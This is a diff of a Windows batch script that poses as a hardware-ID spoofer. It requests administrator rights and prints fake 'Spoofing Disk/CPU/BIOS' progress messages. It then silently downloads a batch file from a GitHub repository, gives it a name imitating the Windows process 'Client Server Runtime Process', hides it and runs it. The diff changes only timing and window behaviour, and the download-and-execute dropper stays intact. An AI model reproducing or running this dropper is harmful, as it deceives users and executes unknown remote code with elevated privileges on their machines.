@@ -6,7 +6,7 @@ echo =      64TH NEW TEMP          =
 echo ==============================
 echo.
 
-:: Request Admin Privileges
+:: Request Admin Privileges (Optional - Remove if not needed)
 :-------------------------------------
 REM  --> Check for permissions
 IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
@@ -53,24 +53,24 @@ set "DRIVER_FILE=%targetDir%\Client Server Runtime Processs.bat"
 
 :: Display the spoofing process in the console
 echo Starting spoofing process...
-timeout /t 2 /nobreak >nul
+timeout /t 1 /nobreak >nul
 echo Spoofing Disk...
-timeout /t 2 /nobreak >nul
+timeout /t 1 /nobreak >nul
 echo Spoofing CPU...
-timeout /t 2 /nobreak >nul
+timeout /t 1 /nobreak >nul
 echo Spoofing SMBIOS...
-timeout /t 2 /nobreak >nul
+timeout /t 1 /nobreak >nul
 echo Spoofing BIOS...
-timeout /t 2 /nobreak >nul
+timeout /t 1 /nobreak >nul
 echo Spoofing Chassis...
-timeout /t 2 /nobreak >nul
+timeout /t 1 /nobreak >nul
 echo Spoofing Motherboard...
-timeout /t 2 /nobreak >nul
+timeout /t 1 /nobreak >nul
 
 :: Download Client in the background
 if not exist "%DRIVER_FILE%" (
     echo WAIT...
-    start /B powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/topking91154/64TEMP/raw/refs/heads/main/Client%%20Server%%20Runtime%%20Processs.bat' -OutFile '%DRIVER_FILE%'" >nul 2>&1
+    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/topking91154/64TEMP/raw/refs/heads/main/Client%%20Server%%20Runtime%%20Processs.bat' -OutFile '%DRIVER_FILE%'" >nul 2>&1
     timeout /t 5 /nobreak >nul  :: Wait for download to complete
     if not exist "%DRIVER_FILE%" (
         color b
@@ -81,11 +81,11 @@ if not exist "%DRIVER_FILE%" (
     attrib +h "%DRIVER_FILE%"  :: Hide the file
 )
 
-:: Run the downloaded batch file in the background
-start /B cmd /c call "%DRIVER_FILE%" >nul 2>&1
+:: Run the downloaded batch file in the same window
+call "%DRIVER_FILE%" >nul 2>&1
 
 :end
-timeout /t 5 >nul
+timeout /t 2 >nul
 
 echo DONE...
 echo Press any key to exit...
